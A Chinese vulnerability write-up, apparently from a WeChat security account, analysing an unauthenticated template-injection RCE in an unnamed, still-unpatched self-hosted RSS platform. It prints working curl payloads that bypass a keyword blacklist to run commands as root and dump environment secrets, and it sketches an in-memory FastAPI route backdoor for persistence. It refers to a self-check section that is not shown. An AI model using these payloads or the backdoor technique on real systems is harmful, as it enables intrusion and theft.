---
title: 某公众号 RSS 平台存在未授权 RCE：从模板注入到内存马
url: https://mp.weixin.qq.com/s/CnTuFt5WrsflpISYeSpv4A
source: Doonsec's feed
date: 2026-09-21
fetch_date: 2026-09-22T07:00:42.321279
---

# 某公众号 RSS 平台存在未授权 RCE：从模板注入到内存马

# 某公众号 RSS 平台存在未授权 RCE：从模板注入到内存马

mimi3
mimi3

赛博生存指南

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

> 漏洞来源：互联网公开的开源项目（某公众号转 RSS 平台；因漏洞尚未修复，隐去平台名称与仓库、镜像地址）
> 验证方式：本地 Docker 隔离实例实测，全部结论有真实回显
> 核心问题：未授权远程代码执行（SSTI）

公众号 RSS 平台是一类自托管工具：把微信公众号的文章源转成 RSS 订阅流，配合阅读器追更。本文分析互联网上一个此类开源实现中存在的未授权 RCE——Docker 一行命令部署、默认监听 8001 端口，除 RSS 输出外还带 webhook 消息推送、图片代理等周边功能。漏洞在可获得的最新版本中仍然存在，因此文中隐去平台名称与项目地址，技术细节原样保留；正在自建 RSS 服务的读者，可用第六节的自查方法判断自己的部署是否受影响。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/JpU6JH8dicqXKeUSJXhibSia9xkoMWkFUumlNsSdj68ZfV5HqGic3qSvNr8jsVe6NtONWzcDabR398q3UXDlsx9ohnx7OWMHRGA802mGct4BtO4/640?wx_fmt=png&from=appmsg)

## 一、攻击面：三个决策叠出 RCE

该平台后端是 Python（FastAPI）。为了支持自定义 RSS 输出格式，作者写了一个自研模板引擎 `TemplateParser`。RCE 不是某一个孤立的 bug，而是三个各自看起来都“可以理解”的决策叠在一起的结果。

**决策一：用 eval() 实现模板表达式。** 模板里 `{{= 表达式 }}` 的语法会被切成表达式，直接送进 Python 原生求值：

```
# core/lax/template_parser.py:1164
eval(expr, eval_globals, context)
```

用 eval 实现模板引擎不是没有先例，但前提是有真正的沙箱。这里的“沙箱”是一个黑名单函数 `_is_safe_expression()`。

**决策二：黑名单防的是源码文本，不是运行时。** 黑名单长这样（节选）：

```
# core/lax/template_parser.py:857-866
forbidden = ['import', 'open', 'exec', 'eval', 'system', 'subprocess',
'__import__', 'getattr', 'setattr', 'delattr', 'compile',
'globals', 'locals', 'vars', 'dir', 'help', 'reload', ...]
expr_lower = expr.lower()
returnnotany(keyword in expr_lower for keyword in forbidden)
```

子串匹配，匹配的是表达式的**源码字符串**。而 Python 表达式可以在运行时拼字符串：`'__imp' + 'ort__'` 的求值结果是 `'__import__'`，但源码里不含 `import` 这个连续子串——检查直接放行。

更致命的是 `_get_safe_globals()` 构造的 eval 全局命名空间没有显式设置 `__builtins__`。按 Python 语义，这种情况下会自动注入完整的 builtins 字典：`__import__` 在场、各种内建函数在场，而 `__builtins__` 这个名字本身也不在黑名单里。沙箱还没开始工作，钥匙已经插在锁上了。

**决策三：RSS 端点的鉴权被注释掉了。**`template` 是一个 GET 查询参数，从 RSS 端点一路传进 TemplateParser：

```
# apis/rss.py:184-196（节选）
# current_user: dict = Depends(get_current_user)
```

鉴权依赖整行被注释。源码里还留着作者自己的一句提醒：“如果需要放开授权，请只允许内网访问，防止被利用攻击”。也就是说，作者知道放开鉴权有风险，但默认部署里它就是放开着的。

三个决策叠起来：无鉴权的 GET 参数 → 自研模板引擎 → eval 加黑名单。一条 HTTP GET 就够了。

## 二、复现：一条 GET，四步到 root

以下命令均在本地 Docker 实例（默认 8001 端口）实测，输出为真实回显。`--globoff` 是为了阻止 curl 解释花括号；实测里 template 参数统一经 Python `urlencode` 编码后发送。

第一步，确认 eval 生效：

```
curl -s --globoff "http://localhost:8001/rss/all?ext=html&template={{= 1+1 }}"
# 返回：2
```

第二步，确认类链穿越可用（黑名单不含 `__class__`、`__mro__`）：

```
curl -s --globoff "http://localhost:8001/rss/all?ext=html&template={{= ''.__class__.__mro__ }}"
# 返回：(<class 'str'>, <class 'object'>)
```

第三步，确认 `__builtins__` 可达。eval 上下文里它是 dict 而非 module，直接按键取：

```
curl -s --globoff "http://localhost:8001/rss/all?ext=html&template={{= type(__builtins__) }}"
# 返回：<class 'dict'>
```

第四步，字符串拼接绕过黑名单，导入 subprocess 执行命令：

```
curl -s --globoff "http://localhost:8001/rss/all?ext=html&template={{= __builtins__['__imp'+'ort__']('subpr'+'ocess').check_output(['id']).decode() }}"
# 返回：uid=0(root) gid=0(root) groups=0(root)
```

容器里跑的是 root。整条链不需要任何凭据、没有任何前置交互。读环境变量同样只要一步：把表达式换成 `__builtins__['__imp'+'ort__']('os').environ`，包括 `PASSWORD` 在内的全部环境变量直接回显。

为排除“回显造假”的可能，还可以让容器把 `id` 输出写进数据目录的文件——经 `-v` 挂载卷，文件会直接出现在宿主机目录里，内容是 root 的 id 输出加容器 hostname。执行身份确凿无疑。

黑名单里每个词都有现成的绕法：

| 黑名单词 | 绕法 | 原理 |
| --- | --- | --- |
| `import` / `__import__` | `'__imp'+'ort__'` | 源码无连续 import 子串 |
| `subprocess` | `'subpr'+'ocess'` | 同上 |
| `open` | 用 `check_output` | 函数名不含 open 子串（注意 `os.popen` 反而会被拦） |
| `getattr` | `__builtins__[key]` | dict 直接按键取 |
| `system` | 用 `check_output` | 不含 system 子串 |

## 拿到 RCE 只是第一步。SSTI 入口有个天然弱点：每次执行命令都要再走一遍 `template` 参数，请求里明晃晃带着 `{{=`，入口一旦被整改，控制权就断了。 在本地实例上，这个 RCE 可以进一步落成一种更隐蔽的形态——**FastAPI 运行时路由内存马**：向运行中进程的路由表动态插入一条原生 Starlette Route，此后命令执行不再经过 SSTI 接口。 原理一句话就能说完：Starlette 的路由匹配是每个请求遍历 `app.router.routes` 列表，运行时插入立即生效，无需重载。核心逻辑示意（非完整 payload）： ``` app = [o for o in gc.get_objects() iftype(o).__name__ == 'FastAPI'][0] route = Route('/8f3a2c1d', handler, methods=['GET', 'POST']) app.router.routes.insert(0, route)   # insert(0): must precede the SPA catch-all ```

## 三、安全说明

本文分析的漏洞来源于互联网公开渠道；全部验证在本人完全可控的本地 Docker 隔离环境完成，未访问任何第三方部署实例。文中 payload 仅用于说明漏洞机理与验证方法，请勿用于未授权目标。

## 参考

* OWASP A03:2021 Injection：https://owasp.org/Top10/A03\_2021-Injection/
* CWE-94 Improper Control of Generation of Code：https://cwe.mitre.org/data/definitions/94.html
* Jinja2 SandboxedEnvironment：https://jinja.palletsprojects.com/en/stable/api/#jinja2.sandbox.SandboxedEnvironment
* OWASP SSRF Prevention Cheat Sheet：https://cheatsheetseries.owasp.org/cheatsheets/Server\_Side\_Request\_Forgery\_Prevention\_Cheat\_Sheet.html

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/JpU6JH8dicqVN9b7iadOceI5KLl2wzhO4kpqdNoRRMEHV7SbRic7yRUz6yNs73iafib3CAXdnJ9TtiaMOIcGIlFzY3KxFNu5Z8ES7ibkHecxWU5Afk/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过